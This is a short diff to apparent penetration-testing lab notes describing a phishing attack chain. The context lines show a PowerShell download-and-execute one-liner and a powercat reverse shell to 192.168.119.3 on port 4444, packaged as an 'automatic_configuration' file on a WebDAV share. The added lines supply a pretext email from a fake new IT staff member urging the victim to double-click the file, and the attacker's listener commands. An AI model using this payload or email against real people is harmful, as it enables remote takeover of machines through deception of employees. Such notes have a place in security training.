@@ -48,6 +48,18 @@ powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://1
 powercat -c 192.168.119.3 -p 4444 -e powershell"
 Save as automatic_configuration,put it in Lhost's webdav folder
 
-nc -nlvp 4444
-python3 -m http.server
+Delivery via email:
+Hello! My name is Dwight, and I'm a new member of the IT Team.
+
+This week I am completing some configurations we rolled out last week.
+To make this easier, I've attached a file that will automatically
+perform each step. Could you download the attachment, open the
+directory, and double-click "automatic_configuration"? Once you
+confirm the configuration in the window that appears, you're all done!
+
+If you have any questions, or run into any problems, please let me
+know!
+
+Lhost: nc -nlvp 4444
+Lhost: python3 -m http.server
 ```
